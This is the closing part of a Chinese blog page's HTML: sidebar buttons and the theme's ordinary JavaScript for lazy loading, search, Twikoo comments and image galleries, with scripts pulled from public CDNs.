0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
